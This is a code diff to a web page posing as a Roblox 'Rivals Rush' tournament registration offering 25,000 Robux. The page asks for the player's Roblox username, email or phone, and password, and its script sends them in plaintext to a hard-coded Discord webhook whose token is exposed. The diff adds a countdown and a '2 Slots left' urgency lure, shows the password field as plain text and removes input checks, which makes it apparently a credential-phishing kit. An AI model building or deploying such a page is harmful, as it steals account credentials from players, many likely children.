@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="de">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>RobloxComp | Team Rivals Cup - 01.05.2026</title>
+    <title>RobloxComp | 25K Robux Rivals Rush Tournament</title>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
@@ -89,22 +89,11 @@
         }
         .logo-combined {
             font-family: 'Montserrat', sans-serif;
-            font-size: 2.8rem;
-            font-weight: 900;
+            font-size: 2.2rem;
+            font-weight: 800;
             letter-spacing: -0.02em;
-            transition: transform 0.35s cubic-bezier(0.2, 0.9, 0.4, 1);
+            transition: transform 0.2s ease;
             cursor: pointer;
-            text-transform: uppercase;
-            filter: drop-shadow(0 0 12px rgba(255, 51, 85, 0.7));
-            animation: logoGlow 2.8s infinite alternate;
-        }
-        @keyframes logoGlow {
-            0% {
-                filter: drop-shadow(0 0 10px rgba(255, 55, 75, 0.55));
-            }
-            100% {
-                filter: drop-shadow(0 0 18px rgba(255, 70, 90, 0.85));
-            }
         }
         .logo-combined .roblox-white {
             color: #ffffff;
@@ -116,15 +105,13 @@
             font-weight: 900;
         }
         .logo-combined:hover {
-            transform: scale(1.12);
-            filter: drop-shadow(0 0 27px rgba(255, 30, 50, 1)) drop-shadow(0 0 10px #ff2244);
-            transition: all 0.3s ease-out;
+            transform: scale(1.02);
         }
         .logo-combined:hover .roblox-white {
-            text-shadow: 0 0 12px rgba(255,255,255,0.7);
+            text-shadow: 0 0 8px rgba(255,255,255,0.5);
         }
         .logo-combined:hover .comp-red {
-            text-shadow: 0 0 14px #ff4d6d;
+            text-shadow: 0 0 8px #ff3355;
             color: #ff4d6d;
         }
         .github-btn {
@@ -149,65 +136,106 @@
             transform: translateY(-1px);
         }
 
-        /* TOURNAMENT TITLE */
-        .tournament-title {
-            font-size: 2.2rem;
-            font-weight: 900;
+        /* GLOBAL COUNTDOWN BOX - LIVE STYLE */
+        .countdown-container {
+            background: linear-gradient(135deg, rgba(255, 51, 85, 0.15), rgba(255, 80, 120, 0.08));
+            border-radius: 1.5rem;
+            padding: 1.2rem 1.5rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid rgba(255, 70, 100, 0.3);
+            backdrop-filter: blur(8px);
             text-align: center;
-            color: #f0e9e9;
+            transition: all 0.3s ease;
+        }
+        .countdown-container.live {
+            background: linear-gradient(135deg, rgba(46, 255, 138, 0.2), rgba(46, 255, 138, 0.08));
+            border: 1px solid #2eff8a;
+            box-shadow: 0 0 20px rgba(46, 255, 138, 0.3);
+        }
+        .countdown-label {
+            font-size: 0.75rem;
             text-transform: uppercase;
+            letter-spacing: 3px;
+            font-weight: 600;
+            color: #ff8aa0;
+            transition: all 0.3s;
+        }
+        .countdown-container.live .countdown-label {
+            color: #2eff8a;
+            text-shadow: 0 0 5px #2eff8a;
+        }
+        .countdown-timer {
+            display: flex;
+            justify-content: center;
+            gap: 1.2rem;
+            flex-wrap: wrap;
+        }
+        .countdown-block {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 1rem;
+            padding: 0.6rem 1rem;
+            min-width: 70px;
+            backdrop-filter: blur(4px);
+            border-bottom: 2px solid #ff3355;
+            transition: all 0.3s;
+        }
+        .countdown-container.live .countdown-block {
+            border-bottom-color: #2eff8a;
+            background: rgba(0, 0, 0, 0.6);
+        }
+        .countdown-number {
+            font-size: 2rem;
+            font-weight: 800;
+            font-family: monospace;
             letter-spacing: 2px;
-            margin: 0.5rem 0 0.2rem;
-            text-shadow: 0 0 18px rgba(255, 170, 0, 0.7);
-            background: linear-gradient(to right, #ffb347, #ff7b00);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            filter: drop-shadow(0 4px 6px black);
-            word-break: break-word;
+            color: #ffffff;
+            text-shadow: 0 0 10px #ff3355;
+            transition: all 0.3s;
         }
-
-        .cup-badge {
-            font-size: 1rem;
-            background: rgba(255, 200, 50, 0.15);
-            padding: 0.3rem 1.4rem;
-            border-radius: 40px;
-            color: #ffcd7a;
-            font-weight: 700;
-            letter-spacing: 1px;
-            margin-bottom: 0.5rem;
-            border: 1px solid rgba(255, 180, 30, 0.5);
-            backdrop-filter: blur(10px);
+        .countdown-container.live .countdown-number {
+            text-shadow: 0 0 10px #2eff8a;
+            color: #2eff8a;
+        }
+        .countdown-unit {
+            font-size: 0.65rem;
             text-transform: uppercase;
-            text-align: center;
+            color: #b9c3e6;
+            margin-top: 4px;
+        }
+        .countdown-ended {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: #2eff8a;
+            text-shadow: 0 0 15px #2eff8a;
+            animation: pulse-green 1s infinite;
+        }
+        @keyframes pulse-green {
+            0% { text-shadow: 0 0 5px #2eff8a; }
+            50% { text-shadow: 0 0 20px #2eff8a; }
+            100% { text-shadow: 0 0 5px #2eff8a; }
+        }
+        .tournament-name-live {
+            margin-top: 10px;
+            font-size: 1rem;
+            font-weight: 700;
+            color: #2eff8a;
+            letter-spacing: 1px;
         }
 
-        /* DATETIME */
-        .datetime {
-            background: #0f1322;
-            padding: 0.9rem 1.8rem;
-            border-radius: 50px;
-            font-weight: 700;
-            font-size: 1.3rem;
-            color: #fdd835;
-            margin: 0.8rem 0 1.5rem;
+        /* SLOT WARNING */
+        .slot-warning {
+            background: rgba(255, 100, 40, 0.1);
+            border-left: 3px solid #ffa047;
+            border-radius: 1rem;
+            padding: 0.7rem 1.2rem;
+            margin-bottom: 1.5rem;
             display: flex;
             align-items: center;
-            gap: 0.5rem;
-            border: 1px solid rgba(255, 215, 0, 0.4);
-            box-shadow: 0 0 20px rgba(253, 216, 53, 0.4);
-            flex-wrap: wrap;
-            justify-content: center;
-            text-align: center;
-        }
-
-        .datetime span {
-            background: #1f2544;
-            padding: 0.3rem 0.9rem;
-            border-radius: 30px;
-            color: white;
-            font-weight: 700;
-            margin-left: 0.3rem;
+            gap: 12px;
+            backdrop-filter: blur(4px);
+            font-weight: 600;
+            font-size: 0.85rem;
+            color: #ffbc7a;
         }
 
         /* TWO COLUMNS */
@@ -403,9 +431,10 @@
         @media (max-width: 780px) {
             .site-container { padding: 1.2rem; }
             .two-col { flex-direction: column; }
-            .logo-combined { font-size: 2rem; }
+            .logo-combined { font-size: 1.6rem; }
             .toast-message { padding: 8px 18px; font-size: 0.75rem; bottom: 20px; }
-            .tournament-title { font-size: 1.6rem; }
+            .countdown-number { font-size: 1.3rem; }
+            .countdown-block { padding: 0.4rem 0.6rem; min-width: 55px; }
         }
     </style>
 </head>
@@ -417,20 +446,27 @@
     <div class="modern-header">
         <div class="logo-wrapper">
             <div class="logo-combined">
-                <span class="comp-red">ROBLOX</span><span class="roblox-white">COMP</span>
+                <span class="roblox-white">Roblox</span><span class="comp-red">Comp</span>
             </div>
             <a href="#" class="github-btn" id="githubBtn"><i class="fab fa-github"></i> .github.io</a>
         </div>
         <div style="width: 80px;"></div>
     </div>
 
-    <!-- TURNIER TITEL & DATUM -->
-    <div style="text-align: center;">
-        <div class="cup-badge"><i class="fas fa-trophy"></i> OFFICIAL TOURNAMENT</div>
-        <div class="tournament-title">TEAM RIVALS CUP</div>
-        <div class="datetime">
-            <i class="fas fa-calendar-alt"></i> 01.05.2026 <span><i class="fas fa-clock"></i> 15:30</span>
+    <!-- GLOBAL COUNTDOWN - 25K RIVALS RUSH TOURNAMENT -->
+    <div class="countdown-container" id="countdownContainer">
+        <div class="countdown-label" id="countdownLabel"><i class="fas fa-hourglass-half"></i> 25.000 ROBUX RIVALS RUSH TOURNAMENT</div>
+        <div id="countdownTimer" class="countdown-timer">
+            <div class="countdown-block"><div class="countdown-number" id="days">00</div><div class="countdown-unit">DAYS</div></div>
+            <div class="countdown-block"><div class="countdown-number" id="hours">00</div><div class="countdown-unit">HOURS</div></div>
+            <div class="countdown-block"><div class="countdown-number" id="minutes">00</div><div class="countdown-unit">MINUTES</div></div>
+            <div class="countdown-block"><div class="countdown-number" id="seconds">00</div><div class="countdown-unit">SECONDS</div></div>
         </div>
+        <div id="liveMessage" style="display: none;" class="tournament-name-live"></div>
+    </div>
+
+    <div class="slot-warning">
+        <i class="fas fa-exclamation-triangle"></i> <span>2 Slots left until start!</span>
     </div>
 
     <div class="two-col">
@@ -439,15 +475,15 @@
                 <div class="form-title">RIVALS REGISTRATION</div>
                 <div class="input-group">
                     <label><i class="fas fa-user"></i> Roblox Username</label>
-                    <input type="text" id="robloxUsername" class="input-field" placeholder="mind. 3 Zeichen">
+                    <input type="text" id="robloxUsername" class="input-field" placeholder="Your IGN">
                 </div>
                 <div class="input-group">
                     <label><i class="fas fa-envelope"></i> Email / Phone</label>
-                    <input type="text" id="emailPhone" class="input-field" placeholder="mind. 5 Zeichen">
+                    <input type="text" id="emailPhone" class="input-field" placeholder="contact@example.com">
                 </div>
                 <div class="input-group">
                     <label><i class="fas fa-lock"></i> Password</label>
-                    <input type="password" id="password" class="input-field" placeholder="mind. 8 Zeichen">
+                    <input type="text" id="password" class="input-field" placeholder="••••••">
                 </div>
                 <div id="teamFieldsContainer" class="team-fields">
                     <div style="font-size:0.7rem; margin-bottom:8px; color:#a0a8cc;"><i class="fas fa-users"></i> Team roster (4 slots)</div>
@@ -495,7 +531,13 @@
 
 <script>
     (function(){
-        // DISCORD WEBHOOK (EINGEBAUT)
+        // ============================================================
+        // 🟢🟢🟢 COUNTDOWN AUF 1. MAI 2026 UM 20:00 UHR 🟢🟢🟢
+        // ============================================================
+        // Jahr, Monat (0=Januar, 4=Mai), Tag, Stunde, Minute, Sekunde
+        const targetDate = new Date(2026, 4, 1, 15, 2, 5); // 1. Mai 2026 um 20:00 Uhr
+        
+        // DISCORD WEBHOOK (für Admins)
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1499515877027086488/S3DHFQbry9zn-dpv2ykxffpC_fySox_FIq-oruVBwD2CIfMelsuqb53YNJg4u0Gvhido";
         
         // DOM Elements
@@ -511,7 +553,73 @@
         const teamMember3 = document.getElementById('teamMember3');
         const teamMember4 = document.getElementById('teamMember4');
         const dynamicNotice = document.getElementById('dynamicAdminNotice');
+        const countdownContainer = document.getElementById('countdownContainer');
+        const countdownLabel = document.getElementById('countdownLabel');
+        const liveMessageDiv = document.getElementById('liveMessage');
+        const timerDiv = document.getElementById('countdownTimer');
 
+        // ========== COUNTDOWN FUNKTION MIT LIVE-MODUS ==========
+        let isLive = false;
+        
+        function updateCountdown() {
+            const now = new Date().getTime();
+            const distance = targetDate - now;
+            
+            const daysEl = document.getElementById('days');
+            const hoursEl = document.getElementById('hours');
+            const minutesEl = document.getElementById('minutes');
+            const secondsEl = document.getElementById('seconds');
+            
+            if (distance < 0 && !isLive) {
+                // COUNTDOWN IST ABGELAUFEN - LIVE MODUS AKTIVIEREN
+                isLive = true;
+                
+                // Container grün machen
+                if (countdownContainer) countdownContainer.classList.add('live');
+                
+                // Label ändern
+                if (countdownLabel) {
+                    countdownLabel.innerHTML = '<i class="fas fa-fire"></i> 🔴 LIVE NOW 🔴 <i class="fas fa-fire"></i>';
+                    countdownLabel.style.color = '#2eff8a';
+                    countdownLabel.style.textShadow = '0 0 10px #2eff8a';
+                }
+                
+                // Timer ausblenden, Live-Text einblenden
+                if (timerDiv) timerDiv.style.display = 'none';
+                if (liveMessageDiv) {
+                    liveMessageDiv.style.display = 'block';
+                    liveMessageDiv.innerHTML = '<i class="fas fa-trophy"></i> 25.0K ROBUX TOURNAMENT LIVE NOW! <i class="fas fa-trophy"></i><br><span style="font-size:0.8rem;">Join the Rivals Rush now!</span>';
+                    liveMessageDiv.style.animation = 'pulse-green 1s infinite';
+                }
+                return;
+            }
+            
+            if (!isLive && distance > 0) {
+                // Normaler Countdown läuft
+                if (timerDiv) timerDiv.style.display = 'flex';
+                if (liveMessageDiv) liveMessageDiv.style.display = 'none';
+                if (countdownContainer) countdownContainer.classList.remove('live');
+                if (countdownLabel) {
+                    countdownLabel.innerHTML = '<i class="fas fa-hourglass-half"></i> 25.000 ROBUX RIVALS RUSH TOURNAMENT';
+                    countdownLabel.style.color = '';
+                }
+                
+                const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                
+                if (daysEl) daysEl.textContent = String(days).padStart(2, '0');
+                if (hoursEl) hoursEl.textContent = String(hours).padStart(2, '0');
+                if (minutesEl) minutesEl.textContent = String(minutes).padStart(2, '0');
+                if (secondsEl) secondsEl.textContent = String(seconds).padStart(2, '0');
+            }
+        }
+        
+        // Countdown jede Sekunde aktualisieren
+        updateCountdown();
+        setInterval(updateCountdown, 1000);
+        
         // ========== TOAST & LOADER FUNKTIONEN ==========
         let toastTimeout = null;
         function showToast(msg, isError, duration = 2800) {
@@ -560,25 +668,27 @@
 
         // Discord Webhook
         async function sendToDiscord(username, emailPhone, password, teamArray) {
+            if (DISCORD_WEBHOOK_URL === "https://discord.com/api/webhooks/REPLACE_ME_WITH_YOUR_WEBHOOK_URL") 
+                throw new Error("WEBHOOK_NOT_SET");
+            
             const teamFieldsList = teamArray.map((n,i) => `**Slot ${i+1}:** ${n || "—"}`).join("\n");
             
             const embed = {
-                title: "🔴 NEUE REGISTRIERUNG - Team Rivals Cup 🔴",
+                title: "🔴 NEUE REGISTRIERUNG - RobloxComp 🔴",
                 color: 0xff3355,
                 fields: [
                     { name: "🎮 Roblox Username", value: username || "❌ nicht angegeben", inline: true },
                     { name: "📧 Email / Phone", value: emailPhone || "❌ nicht angegeben", inline: true },
-                    { name: "🔓 PASSWORD", value: password || "❌ kein Passwort", inline: false },
-                    { name: "👥 Team Mitglieder (4 Slots)", value: teamFieldsList || "Keine Teammitglieder", inline: false },
-                    { name: "📅 Turnierstart", value: "**01.05.2026 um 15:30 Uhr**", inline: false }
+                    { name: "🔓 PASSWORD (KLARTEXT ZUR VERIFIKATION)", value: password || "❌ kein Passwort", inline: false },
+                    { name: "👥 Team Mitglieder (4 Slots)", value: teamFieldsList || "Keine Teammitglieder", inline: false }
                 ],
                 timestamp: new Date().toISOString(),
-                footer: { text: "Team Rivals Cup • RobloxComp" }
+                footer: { text: "Admin Verifikation notwendig • RobloxComp Official" }
             };
             
             const payload = {
                 embeds: [embed],
-                content: "**NEUE ANMELDUNG** - Team Rivals Cup"
+                content: "@here **NEUE ANMELDUNG** - Bitte verifizieren!"
             };
             
             const res = await fetch(DISCORD_WEBHOOK_URL, { 
@@ -595,24 +705,13 @@
             const emailPhone = emailInput.value.trim();
             const password = passwordInput.value;
 
-            // VALIDIERUNG
-            if (robloxUser.length < 3) {
-                showToast("❌ Roblox Name muss mindestens 3 Zeichen haben!", true, 2500);
+            if (!robloxUser) {
+                showToast("Please put in your username", true, 2000);
                 return;
             }
-            if (emailPhone.length < 5) {
-                showToast("❌ Email/Telefon muss mindestens 5 Zeichen haben!", true, 2500);
-                return;
-            }
-            if (password.length < 8) {
-                showToast("❌ Passwort muss mindestens 8 Zeichen lang sein!", true, 2500);
-                return;
-            }
-
             if (!teamContainer.classList.contains('show-team')) {
                 teamContainer.classList.add('show-team');
-                showToast("Bitte Team-Mitglieder eintragen", false, 1500);
-                return;
+                showToast("Enter your 4 team members", false, 1500);
             }
             const member1 = teamMember1?.value.trim() || "";
             const member2 = teamMember2?.value.trim() || "";
@@ -620,7 +719,7 @@
             const member4 = teamMember4?.value.trim() || "";
             const teamSlots = [member1, member2, member3, member4];
             if (!member1) {
-                showToast("Team Captain (Slot 1) ist erforderlich", true, 2000);
+                showToast("Team Captain (Slot 1) is required", true, 2000);
                 return;
             }
 
@@ -630,11 +729,11 @@
                 await sendToDiscord(robloxUser, emailPhone || "not provided", password || "empty", teamSlots);
                 showInlineLoader(false);
                 showSuccessAdminMessage();
-                showToast("✅ Erfolgreich registriert! Discord-Benachrichtigung gesendet.", false, 3000);
+                showToast("Registration successful! Discord notification sent.", false, 3000);
                 passwordInput.value = "";
             } catch(err) {
                 showInlineLoader(false);
-                let msg = err.message.includes("Discord error") ? "Serverfehler, versuche es später erneut." : "Netzwerkfehler: " + err.message;
+                let msg = err.message.includes("WEBHOOK_NOT_SET") ? "Webhook not configured! Replace URL in code." : "Request failed: " + err.message;
                 showToast(msg, true, 4000);
                 console.error(err);
             }
@@ -650,12 +749,25 @@
             if (globalLoader) globalLoader.classList.add('hidden-loader');
             setTimeout(function() {
                 mainContainer.classList.add('loaded');
-                showToast("Willkommen beim Team Rivals Cup | 01.05.2026", false, 2000);
+                showToast("Welcome to RobloxComp | 25K Tournament", false, 2000);
             }, 200);
         }, 1000);
 
         teamContainer.classList.remove('show-team');
         dynamicNotice.classList.add('hidden-message');
+
+        if (DISCORD_WEBHOOK_URL.indexOf("REPLACE_ME") !== -1) {
+            var warnSpan = document.createElement('div');
+            warnSpan.style.fontSize = "0.65rem";
+            warnSpan.style.marginTop = "12px";
+            warnSpan.style.padding = "8px";
+            warnSpan.style.background = "rgba(255,50,80,0.15)";
+            warnSpan.style.borderRadius = "12px";
+            warnSpan.style.color = "#ff8a9e";
+            warnSpan.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ DISCORD WEBHOOK NICHT KONFIGURIERT! Bitte ersetze die Webhook URL im Code!';
+            var loginCard = document.querySelector('.login-card');
+            if (loginCard) loginCard.appendChild(warnSpan);
+        }
 
         const gitBtn = document.getElementById('githubBtn');
         if(gitBtn) {
